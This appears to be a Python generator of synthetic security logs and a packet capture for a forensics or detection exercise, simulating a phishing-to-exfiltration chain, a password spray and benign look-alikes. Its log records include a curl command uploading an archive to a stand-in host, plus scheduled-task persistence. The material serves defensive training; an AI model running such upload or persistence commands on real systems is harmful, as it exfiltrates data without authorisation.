"""Deterministic synthetic demo data. Nothing here is real or confidential.

Scenario (true UTC clock, 2026-08-19): a document opens a script tool, persistence is created,
files are archived, data is sent out, the local copy is deleted, all inside ~12 seconds. The
endpoint log clock is 6h 13m 27s ahead; the network log is 5 s behind. Look-alikes: a nightly
backup job, an approved vulnerability scan. A slow password spray ends in a success."""
import io
import json
import os
import random
import struct
import zipfile

from .util import fmt_ms, parse_time_ms

SKEW_ENDPOINT_MS = 22407 * 1000
SKEW_NETWORK_MS = -5 * 1000
SKEW_FW_MS = 12 * 1000
BASE = parse_time_ms("2026-08-19T00:00:00Z")
NOISE = [("C:\\Program Files\\Google\\Chrome\\chrome.exe", "C:\\Windows\\explorer.exe"),
         ("C:\\Program Files\\Teams\\teams.exe", "C:\\Windows\\explorer.exe"),
         ("C:\\Program Files\\Microsoft Office\\OUTLOOK.EXE", "C:\\Windows\\explorer.exe"),
         ("C:\\Program Files\\Google\\Chrome\\chrome.exe", "C:\\Program Files\\Microsoft Office\\OUTLOOK.EXE"),
         ("C:\\Windows\\CCM\\sccm-client.exe", "C:\\Windows\\System32\\services.exe"),
         ("C:\\Python311\\python.exe", "C:\\Windows\\explorer.exe")]


def _render(schema, ts, c):
    if schema == 1:
        r = {"timestamp": ts, "host": c["host"], "user": c["actor"], "image": c["image"],
             "parent_image": c["parent"], "command_line": c["cmd"], "event": c["event"]}
        if c.get("corr"):
            r["correlation_id"] = c["corr"]
        return r
    if schema == 2:
        r = {"event_time": ts, "device": c["host"], "identity": c["actor"], "process": c["image"],
             "parent": c["parent"], "cmdline": c["cmd"], "event_name": c["event"]}
        if c.get("corr"):
            r["correlation_id"] = c["corr"]
        return r
    inner = {"host": c["host"], "actor": c["actor"], "exe": c["image"], "parent_process": c["parent"],
             "command": c["cmd"], "action": c["event"]}
    if c.get("corr"):
        inner["correlation_id"] = c["corr"]
    return {"time": ts, "record": inner}


def make(out_dir, seed=42, scale=1):
    rng = random.Random(seed)
    os.makedirs(out_dir, exist_ok=True)
    T = lambda h, m, s, ms=0: BASE + ((h * 60 + m) * 60 + s) * 1000 + ms  # noqa: E731
    jit = lambda: rng.randint(-400, 400)  # noqa: E731
    ep, sc, nw, au, fw = [], [], [], [], []
    hosts = [f"WKS-DEMO-0{i}" for i in range(1, 6)]
    users = {h: f"demo\\user{i}" for i, h in enumerate(hosts, 1)}

    for _ in range(1500 * scale):
        h = rng.choice(hosts)
        img, par = rng.choice(NOISE)
        ep.append((rng.randrange(0, 86400000) + BASE + SKEW_ENDPOINT_MS, rng.choice([1, 1, 1, 2, 3]),
                   dict(host=h, actor=users[h], image=img, parent=par, cmd="", event="process_start")))
    for _ in range(200 * scale):
        h = rng.choice(hosts)
        sc.append((rng.randrange(0, 86400000) + BASE,
                   {"host": h, "user": users[h], "script": "Get-Date", "event": "script_block"}))
    for _ in range(400 * scale):
        h = rng.choice(hosts)
        nw.append((rng.randrange(0, 86400000) + BASE + SKEW_NETWORK_MS,
                   {"host": h, "src_ip": "10.20.0.%d" % (hosts.index(h) + 11),
                    "dst": rng.choice(["cdn.example.com", "mail.corp.internal", "updates.example.com"]),
                    "dst_port": 443, "event": "connection"}))

    W = "WKS-DEMO-01"
    U = users[W]
    sysd = "C:\\Windows\\System32\\"
    chain = [  # (true_time_ms, schema, canonical event, corr)
        (T(9, 41, 12), 1, dict(host=W, actor=U, image=sysd + "WindowsPowerShell\\powershell.exe",
                                parent="C:\\Program Files\\Microsoft Office\\WINWORD.EXE",
                                cmd="powershell.exe -File run.ps1", event="process_start"), "A1"),
        (T(9, 41, 14), 2, dict(host=W, actor=U, image=sysd + "schtasks.exe", parent=sysd + "powershell.exe",
                                cmd="schtasks.exe /create /tn SupportSync", event="process_start"), "A3"),
        (T(9, 41, 17), 3, dict(host=W, actor=U, image=sysd + "tar.exe", parent=sysd + "powershell.exe",
                              cmd="tar.exe -a -c -f case.zip records.csv", event="process_start"), ""),
        (T(9, 41, 21), 1, dict(host=W, actor=U, image=sysd + "curl.exe", parent=sysd + "powershell.exe",
                              cmd="curl.exe -T case.zip https://files-sync.example.invalid:8443/u",
                              event="process_start"), "A2"),
        (T(9, 41, 24), 2, dict(host=W, actor=U, image=sysd + "cmd.exe", parent=sysd + "powershell.exe",
                              cmd="", event="file_delete"), ""),
    ]
    for t, schema, c, corr in chain:
        c = dict(c, corr=corr)
        ep.append((t + jit() + SKEW_ENDPOINT_MS, schema, c))
    sc.append((T(9, 41, 12, 400) + jit(), {"host": W, "user": U, "script": "Set-Location C:\\work",
                                            "event": "script_block", "correlation_id": "A1"}))
    sc.append((T(9, 41, 14, 200) + jit(), {"host": W, "user": U, "script": "Register-ScheduledTask SupportSync",
                                            "event": "script_block", "correlation_id": "A3"}))
    sc.append((T(9, 41, 19, 200) + jit(), {"host": W, "user": U, "script": "Resolve-DnsName files-sync.example.invalid",
                                          "event": "script_block", "correlation_id": "A4"}))
    nw.append((T(9, 41, 19) + jit() + SKEW_NETWORK_MS, {"host": W, "src_ip": "10.20.0.11", "event": "dns_query",
                                                       "dst": "files-sync.example.invalid", "dst_port": 53,
                                                       "correlation_id": "A4"}))
    nw.append((T(9, 41, 21, 500) + jit() + SKEW_NETWORK_MS, {"host": W, "src_ip": "10.20.0.11", "event": "connection",
                                                            "dst": "files-sync.example.invalid", "dst_port": 8443,
                                                            "correlation_id": "A2"}))
    # Look-alike 1: nightly backup job on a server (archive + upload to an INTERNAL target).
    S = "SRV-DEMO-07"
    bk = "C:\\Program Files\\Backup\\backupagent.exe"
    ep.append((T(3, 0, 0) + SKEW_ENDPOINT_MS, 1, dict(host=S, actor="svc-nightly", image=sysd + "tar.exe", parent=bk,
                                                     cmd="tar.exe -a -c -f nightly.zip D:\\data", event="process_start")))
    ep.append((T(3, 0, 20) + SKEW_ENDPOINT_MS, 2, dict(host=S, actor="svc-nightly", image=sysd + "curl.exe", parent=bk,
                                                      cmd="curl.exe -T nightly.zip https://backup.corp.internal:9443/up",
                                                      event="process_start", corr="B1")))
    nw.append((T(3, 0, 20, 300) + SKEW_NETWORK_MS, {"host": S, "src_ip": "10.20.0.50", "event": "connection",
                                                    "dst": "backup.corp.internal", "dst_port": 9443,
                                                    "correlation_id": "B1"}))
    # Auth log (reference-quality clock). Background + slow spray + approved scanner.
    ips = ["10.20.%d.%d" % (1 + i // 250, 1 + i % 250) for i in range(40 * scale)]
    for _ in range(300 * scale):
        ok = rng.random() > 0.08
        au.append((BASE + rng.randrange(0, 86400000),
                   {"user": rng.choice(["j.okafor", "t.bello", "a.eze", "m.musa", "k.adeyemi"]),
                    "src_ip": rng.choice(ips), "event": "login_success" if ok else "login_failed"}))
    t = T(8, 5, 0)
    first_fail = t
    for i in range(14):
        row = {"user": ["j.okafor", "t.bello", "a.eze", "m.musa", "k.adeyemi"][i % 5],
               "src_ip": "192.0.2.88", "event": "login_failed"}
        if i == 0:
            row["correlation_id"] = "S2"
        au.append((t, row))
        t += rng.randint(300, 540) * 1000
    succ_t = t + 900000
    au.append((succ_t, {"user": "j.okafor", "src_ip": "192.0.2.88", "event": "login_success",
                        "correlation_id": "S1"}))
    for i in range(40):
        au.append((T(1, 10, 0) + i * 4500, {"user": "svc-scan%d" % (i % 8), "src_ip": "10.77.10.9",
                                           "event": "login_failed"}))
    # Firewall log: a fourth independent vantage point. It saw the exfil connection and the spray's
    # first and successful logins, so those findings are corroborated by a second log source.
    for _ in range(300 * scale):
        h = rng.choice(hosts)
        fw.append((rng.randrange(0, 86400000) + BASE + SKEW_FW_MS,
                   {"host": h, "src_ip": "10.20.0.%d" % (hosts.index(h) + 11), "dst": rng.choice(
                       ["cdn.example.com", "mail.corp.internal"]), "dst_port": 443, "event": "connection",
                    "verdict": "allow"}))
    fw.append((T(9, 41, 21, 500) + jit() + SKEW_FW_MS, {"host": W, "src_ip": "10.20.0.11", "event": "connection",
                                                       "dst": "files-sync.example.invalid", "dst_port": 8443,
                                                       "verdict": "allow", "correlation_id": "A2"}))
    fw.append((T(9, 41, 19) + jit() + SKEW_FW_MS, {"host": W, "src_ip": "10.20.0.11", "event": "dns_query",
                                                  "dst": "files-sync.example.invalid", "dst_port": 53,
                                                  "verdict": "allow", "correlation_id": "A4"}))
    fw.append((first_fail + jit() + SKEW_FW_MS, {"src_ip": "192.0.2.88", "dst": "auth-gw.corp.internal",
                                                 "dst_port": 443, "event": "connection", "verdict": "allow",
                                                 "correlation_id": "S2"}))
    fw.append((succ_t + jit() + SKEW_FW_MS, {"src_ip": "192.0.2.88", "dst": "auth-gw.corp.internal",
                                             "dst_port": 443, "event": "connection", "verdict": "allow",
                                             "correlation_id": "S1"}))
    with open(os.path.join(out_dir, "changes.json"), "w", encoding="utf-8", newline="\n") as f:
        json.dump({"changes": [{"change_id": "CHG-SCAN-DEMO", "status": "APPROVED", "approved_by": "change-advisory",
                                "src_ip": "10.77.10.9", "starts_at": "2026-08-19T00:00:00Z",
                                "ends_at": "2026-08-19T02:00:00Z", "purpose": "authorised vulnerability scan"}]},
                  f, indent=2, sort_keys=True)
        f.write("\n")

    def write(name, rows, extra=()):
        lines = [json.dumps(r, sort_keys=True) for r in rows] + list(extra)
        with open(os.path.join(out_dir, name), "w", encoding="utf-8", newline="\n") as f:
            f.write("\n".join(lines) + "\n")

    epr = [(t_, _render(s_, fmt_ms(t_), c_)) for t_, s_, c_ in ep]
    ep_rows = [r for _, r in sorted(epr, key=lambda p: p[0])]
    dup = ep_rows[100]
    write("endpoint.jsonl", ep_rows[:200] + [dup] + ep_rows[200:],
          extra=['{"timestamp": "2026-07-15T01:02:03Z", "host": "WKS-DEMO-02", "image"', "not json at all",
                 '{"host": "WKS-DEMO-03", "image": "chrome.exe", "event": "process_start"}',
                 '{"timestamp": "yesterday-ish", "host": "WKS-DEMO-04", "image": "teams.exe"}'])
    write("script.jsonl", [dict(r, time=fmt_ms(t_)) for t_, r in sorted(sc, key=lambda p: p[0])])
    write("network.jsonl", [dict(r, ts=fmt_ms(t_)) for t_, r in sorted(nw, key=lambda p: p[0])])
    with open(os.path.join(out_dir, "capture.pcap"), "wb") as f:
        f.write(make_pcap(http_post(exfil_zip(seed)), T(9, 41, 21, 300)))
    write("firewall.jsonl", [dict(r, ts=fmt_ms(t_)) for t_, r in sorted(fw, key=lambda p: p[0])])
    write("auth.jsonl", [dict(r, timestamp=fmt_ms(t_)) for t_, r in sorted(au, key=lambda p: p[0])])


# ---------------------------------------------------------------- packet capture --------------
def exfil_zip(seed=42):
    """Deterministic synthetic 'stolen' archive: a fake records file plus a marker file."""
    r = random.Random(seed + 1)
    rows = ["id,name,amount"] + [f"{i},person{i},{r.randint(100, 99999)}" for i in range(1, 801)]
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        for name, data in (("synthetic-records.csv", "\n".join(rows) + "\n"), ("marker.txt", "DEMO-ONLY\n")):
            zi = zipfile.ZipInfo(name, date_time=(2026, 7, 14, 12, 0, 0))
            zi.compress_type = zipfile.ZIP_DEFLATED
            zf.writestr(zi, data)
    return buf.getvalue()


def _ip(a):
    return bytes(int(x) for x in a.split("."))


def _frame(src, dst, sport, dport, seq, flags, payload=b""):
    tcp = struct.pack("!HHIIBBHHH", sport, dport, seq & 0xFFFFFFFF, 0, 5 << 4, flags, 65535, 0, 0) + payload
    ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 20 + len(tcp), 0, 0, 64, 6, 0, _ip(src), _ip(dst))
    return b"\x02\x00\x00\x00\x00\x01\x02\x00\x00\x00\x00\x02\x08\x00" + ip + tcp


def make_pcap(payload, t0_ms, client=("10.20.0.11", 50123), server=("203.0.113.50", 8443), chunk=1200,
              reorder=True, retransmit=True, drop=None, conflict=False, isn=1000):
    """Classic little-endian pcap of one TCP upload. Options let tests create ugly captures:
    out-of-order segments, an identical retransmission, a conflicting retransmission, or a missing segment."""
    chunks = [payload[i:i + chunk] for i in range(0, len(payload), chunk)]
    segs = [(isn + 1 + i * chunk, c) for i, c in enumerate(chunks)]
    order = list(range(len(segs)))
    if reorder and len(order) > 3:
        order[1], order[2] = order[2], order[1]
    if drop is not None:
        order = [i for i in order if i != drop]
    frames = [(client, server, isn, 0x02, b""), (server, client, 5000, 0x12, b""), (client, server, isn + 1, 0x10, b"")]
    frames += [(client, server, segs[i][0], 0x18, segs[i][1]) for i in order]
    if retransmit and len(segs) > 1:
        frames.append((client, server, segs[0][0], 0x18, segs[0][1]))
    if conflict and len(segs) > 1:
        frames.append((client, server, segs[1][0], 0x18, bytes(b ^ 0xFF for b in segs[1][1])))
    frames.append((client, server, isn + 1 + len(payload), 0x11, b""))
    out = bytearray(struct.pack("<IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 1))
    for n, (a, b, seq, fl, pl) in enumerate(frames):
        ts = t0_ms + n * 20
        fr = _frame(a[0], b[0], a[1], b[1], seq, fl, pl)
        out += struct.pack("<IIII", ts // 1000, (ts % 1000) * 1000, len(fr), len(fr)) + fr
    return bytes(out)


def http_post(zip_bytes, host="files-sync.example.invalid:8443"):
    return (f"POST /u HTTP/1.1\r\nHost: {host}\r\nContent-Length: {len(zip_bytes)}\r\n\r\n").encode() + zip_bytes
